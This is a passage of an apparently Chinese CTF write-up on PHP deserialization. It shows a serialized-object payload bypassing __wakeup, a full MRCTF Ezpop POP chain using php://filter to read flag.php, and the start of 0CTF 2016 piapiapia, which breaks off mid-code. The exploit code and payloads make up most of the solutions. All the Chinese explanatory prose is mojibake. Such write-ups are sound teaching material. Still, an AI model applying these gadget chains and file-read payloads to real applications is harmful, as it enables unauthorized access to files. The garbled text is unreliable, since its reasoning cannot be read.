<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'admin'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">global</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>hello my friend~~&lt;/br>sorry i can't give you the flag!"</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>æ³¨æ„åˆ°index.phpä¸­æœ‰å¯¹getçš„selectå‚æ•°è¿›è¡Œååºåˆ—åŒ–æ“ä½œï¼Œå¹¶ä¸”é¢˜ç›®ç»™äº†ä¸€ä¸ªclass.phpä¸­çš„Nameç±»ï¼Œäºæ˜¯æ„é€ ååºåˆ—åŒ–æ¡ä»¶ï¼š</p><p>è§‚å¯Ÿchass.phpä»£ç å‘ç°åªè¦ä»¤password=100ï¼Œusername=adminï¼Œä¸”ç»•è¿‡__wakeupå‡½æ•°å³å¯ï¼Œäºæ˜¯å¾—åˆ°payloadï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Name"</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"%00Name%00username"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"admin"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"%00Name%00password"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"100"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>ä¼ å…¥å³å¯</p><hr><h3 id="MRCTFâ€”Ezpop"><a href="#MRCTFâ€”Ezpop" class="headerlink" title="MRCTFâ€”Ezpop"></a>MRCTFâ€”Ezpop</h3><p>é¢˜ç›®æºç ï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">//flag is in flag.php</span><span class="token comment">//WTF IS THIS?</span><span class="token comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span><span class="token comment">//And Crack It!</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Modifier</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span>  <span class="token variable">$var</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">append</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">append</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">var</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Show</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Welcome to '</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">str</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/gopher|http|file|ftp|https|dict|\.\./i"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hacker"</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Test</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">p</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$function</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">p</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pop'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    @<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pop'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>ä¸€æ­¥æ­¥å®¡è®¡ä»£ç </p><p>é¦–å…ˆçœ‹åˆ°æœ€åçš„ifè¯­å¥ï¼Œé¢˜ç›®ç»™å‡ºäº†ä¸€ä¸ªå¯ä»¥getçš„popå‚æ•°ï¼Œéšåå¯¹å…¶è¿›è¡Œååºåˆ—åŒ–æ“ä½œï¼Œäºæ˜¯ç›´æ¥æƒ³åˆ°åˆ©ç”¨ååºåˆ—åŒ–æ¼æ´ï¼Œå†å¾€ä¸Šçœ‹æ‰¾åˆ©ç”¨ç‚¹</p><p>é¢˜ç›®ç»™å‡ºäº†ä¸‰ä¸ªç±»ï¼Œè§‚å¯Ÿå¯åˆ©ç”¨ç‚¹å¯ä»¥åœ¨<code>Modifier</code>å¯¹è±¡ä¸­çœ‹åˆ°ä¸€ä¸ªincludeå‡½æ•°ï¼Œè¿™é‡Œå°±å¯ä»¥åˆ©ç”¨æ–‡ä»¶åŒ…å«ä»è€Œè¾¾åˆ°ä»»æ„æ–‡ä»¶è¯»å–çš„æ•ˆæœï¼Œå…·ä½“æ–¹æ³•åªè¦ä»¤<code>include</code>çš„<code>value</code>ä¸º<code>php://filter/read=convert.base64-encode/resource=./flag.php</code>å³å¯è¯»å–flagæ–‡ä»¶ï¼Œæ‰€ä»¥å°±éœ€è¦æƒ³åŠæ³•åˆ©ç”¨è¿™ä¸ªç‚¹</p><p>å¯ç”¨çœ‹åˆ°<code>Modifier</code>å¯¹è±¡ä¸­æœ‰ä¸€ä¸ª<code>__invoke</code>æ–¹æ³•ä»£ç å¦‚ä¸‹</p><pre class="language-PHP" data-language="PHP"><code class="language-PHP">public function __invoke()&#123;    $this-&gt;append($this-&gt;var);&#125;</code></pre><p>é‡Œé¢è°ƒç”¨äº†å¯è§¦å‘æ¡ä»¶çš„<code>append</code>æ–¹æ³•ï¼Œè€Œæ­¤æ–¹æ³•ä¸­çš„<code>var</code>å±æ€§æ˜¯å¯æ§çš„ï¼Œäºæ˜¯å°±å¯ä»¥ç›´æ¥åˆ©ç”¨<code>var</code>å±æ€§æ¥è°ƒç”¨<code>append</code>æ–¹æ³•ï¼Œä»è€Œè¾¾åˆ°æ–‡ä»¶åŒ…å«çš„æ•ˆæœï¼Œåˆæ­¥æ„é€ åºåˆ—åŒ–å‚æ•°</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">Modifier</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span> <span class="token variable">$var</span><span class="token operator">=</span><span class="token string single-quoted-string">'php://filter/read=convert.base64-encode/resource=./flag.php'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Modifier</span><span class="token punctuation">;</span></code></pre><p>è€Œ<code>__invoke</code>å‡½æ•°çš„ä½¿ç”¨æ–¹æ³•æ˜¯å½“å°è¯•ä»¥è°ƒç”¨å‡½æ•°çš„æ–¹æ³•è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶è§¦å‘ï¼Œäºæ˜¯æ‰¾åˆ°å¯è§¦å‘æ¡ä»¶ï¼Œå¯ä»¥åœ¨ä¸‹é¢çš„<code>Test</code>å¯¹è±¡ä¸­çœ‹åˆ°ä¸€ä¸ª<code>__get</code>æ–¹æ³•</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$function</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">p</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>è¿™ä¸ªæ–¹æ³•é‡Œé¢è¿”å›çš„å‚æ•°åˆšå¥½å¯ä»¥ä½œä¸ºå‡½æ•°æ¡ä»¶è°ƒç”¨ä¸€ä¸ªå¯¹è±¡ï¼Œäºæ˜¯å¯ä»¥åˆ©ç”¨æ­¤æ–¹æ³•è°ƒç”¨<code>Modifier</code>å¯¹è±¡ï¼Œåªéœ€ä»¤é‡Œé¢çš„å‚æ•°<code>p</code>ä¸ºåˆ›å»ºçš„æ–°çš„<code>Modifier</code>å¯¹è±¡å³å¯ï¼Œå°±å¯ä»¥è§¦å‘<code>__invoke</code>å‡½æ•°ï¼Œè€Œ<code>Test</code>å¯¹è±¡ä¸­çš„å‚æ•°<code>p</code>æ˜¯å¯æ§çš„ï¼Œäºæ˜¯å°±å¯ä»¥è¿›ä¸€æ­¥æ„é€ åºåˆ—åŒ–å‚æ•°</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">Modifier</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span> <span class="token variable">$var</span><span class="token operator">=</span><span class="token string single-quoted-string">'php://filter/read=convert.base64-encode/resource=./flag.php'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Test</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Modifier</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">-></span><span class="token property">p</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">;</span></code></pre><p>éšåå°±éœ€è¦æƒ³åŠæ³•å¦‚ä½•è§¦å‘<code>__get</code>å‡½æ•°ï¼Œ<code>__get</code>å‡½æ•°çš„è§¦å‘æ¡ä»¶æ˜¯å½“å¯¹è±¡è¯»å–ä¸å¯è®¿é—®çš„å±æ€§çš„æ—¶å€™è§¦å‘ï¼Œäºæ˜¯å°±éœ€è¦æ„é€ ä¸€ä¸ªä¸å¯è®¿é—®çš„å±æ€§æ¥è§¦å‘æ­¤å‡½æ•°ï¼Œå½“ç„¶è¿™ä¸ªå±æ€§åœ¨å¯¹è±¡å†…éƒ¨è‚¯å®šæ˜¯ä¸å­˜åœ¨çš„ï¼Œäºæ˜¯å°±è¦åˆ°å¤–éƒ¨å»æ‰¾ï¼Œå¯ä»¥çœ‹åˆ°<code>Show</code>å¯¹è±¡ä¸­çš„<code>__toString</code>æ–¹æ³•</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">str</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>è¿™é‡Œå°±å¯ä»¥æ„é€ <code>str</code>å‚æ•°ä¸ºä¸€ä¸ª<code>Test</code>å¯¹è±¡ï¼Œç„¶åè°ƒç”¨<code>source</code>å±æ€§ï¼Œè€Œ<code>Test</code>å¯¹è±¡ä¸­æ˜¯æ²¡æœ‰<code>source</code>è¿™ä¸ªå±æ€§çš„ï¼Œè¿™æ ·å°±å¯ä»¥è§¦å‘å¯¹è±¡ä¸­çš„<code>__get</code>æ–¹æ³•ï¼Œè€Œ<code>Show</code>å¯¹è±¡ä¸­çš„<code>str</code>å±æ€§æ˜¯å¯æ§çš„ï¼Œäºæ˜¯å°±å¯ä»¥æ¥ç€æ„é€ </p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">Modifier</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span> <span class="token variable">$var</span><span class="token operator">=</span><span class="token string single-quoted-string">'php://filter/read=convert.base64-encode/resource=./flag.php'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Show</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Test</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Modifier</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">-></span><span class="token property">p</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">-></span><span class="token property">str</span> <span class="token operator">=</span> <span class="token variable">$b</span></code></pre><p>ç„¶åå°±è¯¥æƒ³æƒ³<code>__toString</code>æ–¹æ³•è¯¥å¦‚ä½•è§¦å‘äº†ï¼Œ<code>__toString</code>æ–¹æ³•è§¦å‘æ¡ä»¶æ˜¯å½“å¯¹è±¡è¢«å½“åšä¸€ä¸ªå­—ç¬¦ä¸²è¢«è°ƒç”¨ï¼Œäºæ˜¯å¯»æ‰¾è§¦å‘ç‚¹å¯ä»¥åœ¨å‡½æ•°ä¸‹æ–¹çœ‹åˆ°ä¸€ä¸ª<code>__wakeup</code>æ–¹æ³•</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/gopher|http|file|ftp|https|dict|\.\./i"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hacker"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p><code>__wakeup</code>å‡½æ•°ä¹‹ä¸­çš„<code>source</code>å±æ€§åœ¨è¿›è¡Œ<code>preg_match</code>æ­£åˆ™åŒ¹é…çš„æ—¶å€™ä¼šè¢«å½“åšä¸€ä¸ªå­—ç¬¦ä¸²æ¥ä½¿ç”¨ï¼Œäºæ˜¯å°±å¯ä»¥ä»¤<code>source</code>å±æ€§ä¸ºä¸Šä¸€ä¸ªæ„é€ çš„<code>Show</code>å¯¹è±¡ï¼Œè¿™æ ·åœ¨è¿›è¡Œæ­£åˆ™åŒ¹é…åˆ¤æ–­çš„æ—¶å€™å°±ä¼šå§è¿™ä¸ªå¯¹è±¡å½“åšå­—ç¬¦ä¸²æ¥å¤„ç†ï¼Œä»è€Œå°±å¯ä»¥è§¦å‘<code>__toString</code>æ–¹æ³•ï¼Œäºæ˜¯å°±å¯ä»¥å†™å‡ºæ„é€ æ–¹æ³•</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">Modifier</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span> <span class="token variable">$var</span><span class="token operator">=</span><span class="token string single-quoted-string">'php://filter/read=convert.base64-encode/resource=./flag.php'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Show</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Test</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Modifier</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">-></span><span class="token property">p</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">-></span><span class="token property">str</span> <span class="token operator">=</span> <span class="token variable">$b</span><span class="token punctuation">;</span><span class="token variable">$d</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">;</span><span class="token variable">$d</span><span class="token operator">-></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token variable">$c</span><span class="token punctuation">;</span></code></pre><p><code>__wakeup</code>è§¦å‘çš„æ¡ä»¶æ˜¯å½“æˆ‘ä»¬ååºåˆ—åŒ–è¿™ä¸ªå¯¹è±¡çš„æ—¶å€™å°±ä¼šè§¦å‘è¿™ä¸ªå‡½æ•°ï¼Œè¿™ä¸ªæ–¹æ³•å°±æ— éœ€æˆ‘ä»¬å†å»æ‰¾è§¦å‘ç‚¹äº†ï¼Œåªéœ€è¦æŠŠ<code>Show</code>ååºåˆ—åŒ–å°±å¯ä»¥äº†ï¼Œè€Œè¿™é¢˜çš„<code>pop</code>å‚æ•°å°±æä¾›äº†è¿™æ ·çš„æ¡ä»¶ï¼Œäºæ˜¯æœ€ç»ˆæ„é€ å‡ºåºåˆ—åŒ–æ–¹æ³•</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">Modifier</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span> <span class="token variable">$var</span><span class="token operator">=</span><span class="token string single-quoted-string">'php://filter/read=convert.base64-encode/resource=./flag.php'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Show</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Test</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Modifier</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">-></span><span class="token property">p</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">-></span><span class="token property">str</span> <span class="token operator">=</span> <span class="token variable">$b</span><span class="token punctuation">;</span><span class="token variable">$d</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">;</span><span class="token variable">$d</span><span class="token operator">-></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token variable">$c</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$d</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>äºæ˜¯æœ€æ€»payloadï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Show"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"source"</span><span class="token punctuation">;</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Show"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"source"</span><span class="token punctuation">;</span><span class="token constant">N</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"str"</span><span class="token punctuation">;</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Test"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"p"</span><span class="token punctuation">;</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Modifier"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"%00*%00var"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">59</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"php://filter/read=convert.base64-encode/resource=./flag.php"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"str"</span><span class="token punctuation">;</span><span class="token constant">N</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>getä¼ å…¥pop=payloadå³å¯å¾—åˆ°base64åŠ å¯†åçš„flagï¼Œè§£å¯†å³å¯ã€‚</p><h3 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="0CTF 2016-piapiapia"></a>0CTF 2016-piapiapia</h3><p>ç•Œé¢ï¼š</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200412180255952.png" alt loading="lazy"></p><p>é¢˜ç›®ä¸€å…±å››ä¸ªç•Œé¢ï¼Œloginï¼Œregisterï¼Œupdateå’Œprofileï¼ˆä¹Ÿå°±æ˜¯ç¬¬ä¸€ä¸ªæ˜¾ç¤ºç•Œé¢ï¼‰</p><p>å‰æœŸæ¢æµ‹sqlæ³¨å…¥å’Œæ–‡ä»¶ä¸Šä¼ å¥½åƒéƒ½æ²¡å•¥æ•ˆæœï¼Œéšåæ‰«ä¸€ä¸‹å‘ç°å­˜åœ¨<a href="http://www.zipæºç æ³„éœ²ï¼Œä»£ç å®¡è®¡">www.zipæºç æ³„éœ²ï¼Œä»£ç å®¡è®¡</a></p><p>ç®€å•çœ‹ä¸€ä¸‹ï¼Œçœç•¥HTMLå’Œä¸€äº›æ— å…³éƒ¨åˆ†</p><p>index.php</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'class.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Location: profile.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">exit</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token 